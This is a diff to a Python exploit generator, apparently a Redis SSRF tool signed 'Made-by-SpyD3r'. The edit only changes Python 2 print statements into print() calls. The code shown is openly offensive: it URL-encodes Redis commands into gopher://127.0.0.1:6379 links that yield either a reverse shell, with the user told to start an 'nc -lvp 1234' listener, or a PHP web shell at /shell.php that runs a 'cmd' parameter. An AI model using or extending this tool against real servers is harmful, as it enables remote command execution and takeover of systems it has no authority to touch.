@@ -49,10 +49,10 @@ save\r
 
 """
         finalpayload = urllib.quote_plus(payload).replace("+","%20").replace("%2F","/").replace("%25","%").replace("%3A",":")
-        print "\033[93m" +"\nYour gopher link is ready to get Reverse Shell: \n"+ "\033[0m"
-        print "\033[04m" +"gopher://127.0.0.1:6379/_" + finalpayload+ "\033[0m"
-        print "\033[01m" +"\nBefore sending request plz do `nc -lvp 1234`"+ "\033[0m"
-        print "\n" + "\033[41m" +"-----------Made-by-SpyD3r-----------"+"\033[0m"
+        print("\033[93m" +"\nYour gopher link is ready to get Reverse Shell: \n"+ "\033[0m")
+        print("\033[04m" +"gopher://127.0.0.1:6379/_" + finalpayload+ "\033[0m")
+        print("\033[01m" +"\nBefore sending request plz do `nc -lvp 1234`"+ "\033[0m")
+        print("\n" + "\033[41m" +"-----------Made-by-SpyD3r-----------"+"\033[0m")
 
 
 
@@ -102,13 +102,13 @@ save\r
 
 """
         finalpayload = urllib.quote_plus(payload).replace("+","%20").replace("%2F","/").replace("%25","%").replace("%3A",":")
-        print "\033[93m" +"\nYour gopher link is Ready to get PHP Shell: \n"+ "\033[0m"
-        print "\033[04m" +"gopher://127.0.0.1:6379/_" + finalpayload+ "\033[0m"
-        print "\033[01m"+"\nWhen it's done you can get PHP Shell in /shell.php at the server with `cmd` as parmeter. "+ "\033[0m"
-        print "\n" + "\033[41m" +"-----------Made-by-SpyD3r-----------"+"\033[0m"
+        print("\033[93m" +"\nYour gopher link is Ready to get PHP Shell: \n"+ "\033[0m")
+        print("\033[04m" +"gopher://127.0.0.1:6379/_" + finalpayload+ "\033[0m")
+        print("\033[01m"+"\nWhen it's done you can get PHP Shell in /shell.php at the server with `cmd` as parmeter. "+ "\033[0m")
+        print("\n" + "\033[41m" +"-----------Made-by-SpyD3r-----------"+"\033[0m")
 
 
-    print "\033[01m"+"\nReady To get SHELL\n"+ "\033[0m"
+    print("\033[01m"+"\nReady To get SHELL\n"+ "\033[0m")
     what = raw_input("\033[35m" +"What do you want?? (ReverseShell/PHPShell): "+ "\033[0m")
     what = what.lower()
     if("rev" in what):
@@ -116,5 +116,5 @@ save\r
     elif("php" in what):
         get_Redis_PHPShell()
     else:
-        print "\033[93m" +"Plz choose between those two"+ "\033[0m"
+        print("\033[93m" +"Plz choose between those two"+ "\033[0m")
         exit()
